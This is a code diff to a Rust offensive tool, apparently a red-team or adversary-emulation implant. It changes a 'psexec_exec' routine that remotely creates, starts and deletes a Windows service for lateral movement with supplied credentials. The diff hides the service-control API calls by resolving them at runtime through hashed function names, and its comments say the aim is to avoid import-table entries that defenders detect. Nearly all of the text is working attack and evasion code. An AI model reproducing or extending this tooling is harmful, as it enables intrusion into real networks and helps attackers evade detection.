@@ -56,27 +56,7 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
     Ok(std::mem::transmute_copy(&addr))
 }
 
-/// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
-const fn hash_str_const(s: &[u8]) -> u32 {
-    let mut h: u32 = pe_resolve::SEED;
-    let mut i = 0;
-    while i < s.len() {
-        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
-        i += 1;
-    }
-    h
-}
-
-/// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
-const fn hash_wstr_const(w: &[u16]) -> u32 {
-    let mut h: u32 = pe_resolve::SEED;
-    let mut i = 0;
-    while i < w.len() {
-        h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
-        i += 1;
-    }
-    h
-}
+use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // DLL wide names and hashes (not in pe_resolve build.rs).
 const OLE32_DLL_W: &[u16] = &['o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
@@ -97,6 +77,15 @@ const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
 const HASH_WNETADDCONNECTION2W: u32 = hash_str_const(b"WNetAddConnection2W\0");
 const HASH_WNETCANCELCONNECTION2W: u32 = hash_str_const(b"WNetCancelConnection2W\0");
 
+// ── API hash constants (advapi32 — SCM functions) ───────────────────────────
+const HASH_OPENSCMANAGERW: u32  = hash_str_const(b"OpenSCManagerW\0");
+const HASH_CREATESERVICEW: u32  = hash_str_const(b"CreateServiceW\0");
+const HASH_STARTSERVICEW: u32   = hash_str_const(b"StartServiceW\0");
+const HASH_DELETESERVICE: u32   = hash_str_const(b"DeleteService\0");
+const HASH_CLOSESERVICEHANDLE: u32 = hash_str_const(b"CloseServiceHandle\0");
+const HASH_OPENSERVICEW: u32    = hash_str_const(b"OpenServiceW\0");
+const HASH_QUERYSERVICESTATUS: u32 = hash_str_const(b"QueryServiceStatus\0");
+
 // Function pointer types.
 type FnCoInitializeEx = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> i32;
 type FnCoUninitialize = unsafe extern "system" fn();
@@ -113,6 +102,49 @@ type FnWNetAddConnection2W = unsafe extern "system" fn(
     *mut winapi::um::winnetwk::NETRESOURCEW, *const u16, *const u16, u32,
 ) -> i32;
 type FnWNetCancelConnection2W = unsafe extern "system" fn(*const u16, u32, i32) -> i32;
+
+// ── Function pointer types (advapi32 — SCM) ────────────────────────────────
+type FnOpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut std::ffi::c_void;
+type FnCreateServiceW = unsafe extern "system" fn(
+    *mut std::ffi::c_void,     // hSCManager
+    u32,                        // dwDesiredAccess
+    u32,                        // dwServiceType
+    u32,                        // dwStartType
+    u32,                        // dwErrorControl
+    *const u16,                 // lpBinaryPathName
+    *const u16,                 // lpLoadOrderGroup
+    *mut u32,                   // lpdwTagId
+    *const u16,                 // lpDependencies
+    *const u16,                 // lpServiceStartName
+    *const u16,                 // lpPassword
+    *const u16,                 // lpDisplayName
+) -> *mut std::ffi::c_void;
+type FnStartServiceW = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *const u16) -> i32;
+type FnDeleteService = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnCloseServiceHandle = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnOpenServiceW = unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, u32) -> *mut std::ffi::c_void;
+type FnQueryServiceStatus = unsafe extern "system" fn(*mut std::ffi::c_void, *mut ServiceStatus) -> i32;
+
+// ── SCM constants (replacing IAT-producing winsvc imports) ──────────────────
+const SERVICE_ALL_ACCESS: u32 = 0x000F01FF;
+const SERVICE_WIN32_OWN_PROCESS: u32 = 0x00000010;
+const SERVICE_DEMAND_START: u32 = 0x00000003;
+const SERVICE_ERROR_IGNORE: u32 = 0x00000000;
+
+/// SERVICE_STATUS layout (replacing winsvc import).
+#[repr(C)]
+struct ServiceStatus {
+    dwServiceType: u32,
+    dwCurrentState: u32,
+    dwControlsAccepted: u32,
+    dwWin32ExitCode: u32,
+    dwServiceSpecificExitCode: u32,
+    dwCheckPoint: u32,
+    dwWaitHint: u32,
+}
+
+// SERVICE_STOPPED
+const SERVICE_STOPPED: u32 = 1;
 
 /// Null GUID used as the IID parameter in IDispatch::GetIDsOfNames / Invoke.
 const IID_NULL: winapi::shared::guiddef::GUID = winapi::shared::guiddef::GUID {
@@ -192,13 +224,35 @@ pub fn psexec_exec(
     username: Option<&str>,
     password: Option<&str>,
 ) -> Result<String> {
-    use winapi::um::winsvc::{
-        OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService,
-        CloseServiceHandle, OpenServiceW, QueryServiceStatus,
-        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
-        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+    // ── Resolve all SCM functions at runtime (no IAT entries) ───────────
+    let fn_open_scm: FnOpenSCManagerW = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_OPENSCMANAGERW)
+            .expect("OpenSCManagerW resolution failed")
     };
-    use winapi::um::winsvc::SERVICE_STATUS;
+    let fn_create_svc: FnCreateServiceW = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_CREATESERVICEW)
+            .expect("CreateServiceW resolution failed")
+    };
+    let fn_start_svc: FnStartServiceW = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_STARTSERVICEW)
+            .expect("StartServiceW resolution failed")
+    };
+    let fn_delete_svc: FnDeleteService = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_DELETESERVICE)
+            .expect("DeleteService resolution failed")
+    };
+    let fn_close_handle: FnCloseServiceHandle = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_CLOSESERVICEHANDLE)
+            .expect("CloseServiceHandle resolution failed")
+    };
+    let fn_open_svc: FnOpenServiceW = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_OPENSERVICEW)
+            .expect("OpenServiceW resolution failed")
+    };
+    let fn_query_status: FnQueryServiceStatus = unsafe {
+        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_QUERYSERVICESTATUS)
+            .expect("QueryServiceStatus resolution failed")
+    };
 
     let service_name = format!("{}_{}", common::ioc::IOC_SERVICE_PREFIX, crate::common_short_id());
     let display_name = service_name.clone();
@@ -225,7 +279,7 @@ pub fn psexec_exec(
 
     // Open remote SCM.
     let scm = unsafe {
-        OpenSCManagerW(
+        fn_open_scm(
             scm_path.as_ptr(),
             ptr::null_mut(),
             SERVICE_ALL_ACCESS,
@@ -237,7 +291,7 @@ pub fn psexec_exec(
 
     // Create the service.
     let svc = unsafe {
-        CreateServiceW(
+        fn_create_svc(
             scm,
             svc_name_w.as_ptr(),
             disp_name_w.as_ptr(),
@@ -256,33 +310,33 @@ pub fn psexec_exec(
 
     if svc.is_null() {
         let err = unsafe { get_last_error() };
-        unsafe { CloseServiceHandle(scm) };
+        unsafe { fn_close_handle(scm) };
         return Err(anyhow!("CreateServiceW failed: error {err}"));
     }
 
     // Start the service.
-    let ok = unsafe { StartServiceW(svc, 0, ptr::null_mut()) };
+    let ok = unsafe { fn_start_svc(svc, 0, ptr::null_mut()) };
     if ok == 0 {
         let err = unsafe { get_last_error() };
         // ERROR_SERVICE_ALREADY_RUNNING (1056) is OK.
         if err != 1056 {
             unsafe {
-                DeleteService(svc);
-                CloseServiceHandle(svc);
-                CloseServiceHandle(scm);
+                fn_delete_svc(svc);
+                fn_close_handle(svc);
+                fn_close_handle(scm);
             };
             return Err(anyhow!("StartServiceW failed: error {err}"));
         }
     }
 
     // Wait for the service to stop (poll up to 30 seconds).
-    let mut status: SERVICE_STATUS = unsafe { std::mem::zeroed() };
+    let mut status: ServiceStatus = unsafe { std::mem::zeroed() };
     for _ in 0..30 {
-        let ok = unsafe { QueryServiceStatus(svc, &mut status) };
+        let ok = unsafe { fn_query_status(svc, &mut status) };
         if ok == 0 {
             break;
         }
-        if status.dwCurrentState == 1 { // SERVICE_STOPPED
+        if status.dwCurrentState == SERVICE_STOPPED {
             break;
         }
         std::thread::sleep(std::time::Duration::from_secs(1));
@@ -290,9 +344,9 @@ pub fn psexec_exec(
 
     // Clean up the service.
     unsafe {
-        DeleteService(svc);
-        CloseServiceHandle(svc);
-        CloseServiceHandle(scm);
+        fn_delete_svc(svc);
+        fn_close_handle(svc);
+        fn_close_handle(scm);
     }
 
     Ok(format!(
